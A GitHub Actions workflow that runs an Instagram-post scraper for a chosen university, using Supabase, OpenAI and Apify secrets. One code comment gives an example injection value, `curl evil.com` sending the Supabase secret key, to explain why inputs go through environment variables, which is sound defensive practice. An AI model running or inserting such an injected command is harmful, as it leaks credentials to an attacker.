name: Big Scrape

# Manually-triggered batch scrape across one school's Instagram handles.
# Calls services/wat2do via backend/jobs/scrape.py. v2 uses Supabase
# Storage instead of S3, so AWS secrets are no longer required.

on:
  workflow_dispatch:
    inputs:
      school:
        description: 'School to scrape'
        required: true
        type: choice
        options:
          - 'University of Waterloo'
          - 'University of Pennsylvania'
          - 'New York University'
          - 'Columbia University'
          - 'Massachusetts Institute of Technology'
      limit:
        description: 'Max posts per user (Apify resultsLimit)'
        required: true
        type: string
        default: '100'
      cutoff_days:
        description: 'Drop posts older than this many days'
        required: true
        type: string
        default: '4'
      dry_run:
        description: 'Dry run (process only the first handle, no DB writes)'
        required: true
        type: boolean
        default: true

jobs:
  big_scrape:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    env:
      ENVIRONMENT: production
      # Supabase (read/write via service-role key; bypasses RLS).
      SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
      SUPABASE_KEY: ${{ secrets.SUPABASE_KEY }}
      SUPABASE_SECRET_KEY: ${{ secrets.SUPABASE_SECRET_KEY }}
      SUPABASE_JWT_SECRET: ${{ secrets.SUPABASE_JWT_SECRET }}
      # OpenAI vision extraction (services/wat2do/extractor.py).
      OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
      # Apify Instagram-post-scraper (services/wat2do/instagram_scraper.py).
      APIFY_API_TOKEN: ${{ secrets.APIFY_API_TOKEN }}

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Cache pip
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ hashFiles('backend/requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-

      - name: Install dependencies
        working-directory: backend
        run: |
          pip install --prefer-binary -r requirements.txt

      - name: Resolve URL file for school
        id: urls
        run: |
          case "${{ inputs.school }}" in
            "University of Waterloo")
              echo "file=services/wat2do/urls/uwaterloo.txt" >> "$GITHUB_OUTPUT"
              ;;
            "University of Pennsylvania")
              echo "file=services/wat2do/urls/upenn.txt" >> "$GITHUB_OUTPUT"
              ;;
            "New York University")
              echo "file=services/wat2do/urls/nyu.txt" >> "$GITHUB_OUTPUT"
              ;;
            "Columbia University")
              echo "file=services/wat2do/urls/columbia.txt" >> "$GITHUB_OUTPUT"
              ;;
            "Massachusetts Institute of Technology")
              echo "file=services/wat2do/urls/mit.txt" >> "$GITHUB_OUTPUT"
              ;;
            *)
              echo "Unknown school: ${{ inputs.school }}"
              exit 1
              ;;
          esac

      - name: Run scraper
        working-directory: backend
        # `inputs.limit` and `inputs.cutoff_days` are typed `string` (so the
        # Action UI accepts an empty default), then validated as integers
        # by argparse. Pass them via env vars rather than direct
        # ${{ … }} substitution into the shell — substitution is raw text
        # replacement done before bash parses the line, so a value like
        # `100; curl evil.com -d "$SUPABASE_SECRET_KEY"` would otherwise
        # exfiltrate the service-role key on every Big Scrape a repo
        # collaborator can dispatch.
        env:
          URLS_FILE: ${{ steps.urls.outputs.file }}
          SCHOOL: ${{ inputs.school }}
          LIMIT: ${{ inputs.limit }}
          CUTOFF_DAYS: ${{ inputs.cutoff_days }}
          DRY_RUN_FLAG: ${{ inputs.dry_run && '--dry-run' || '' }}
        run: |
          mkdir -p logs
          set -o pipefail
          python -u jobs/scrape.py \
            --urls-file "$URLS_FILE" \
            --school "$SCHOOL" \
            --limit "$LIMIT" \
            --cutoff-days "$CUTOFF_DAYS" \
            $DRY_RUN_FLAG \
            2>&1 | tee logs/scraping.log

      - name: Upload logs as artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: big-scrape-logs-${{ github.run_number }}
          path: backend/logs/scraping.log
          if-no-files-found: 'ignore'
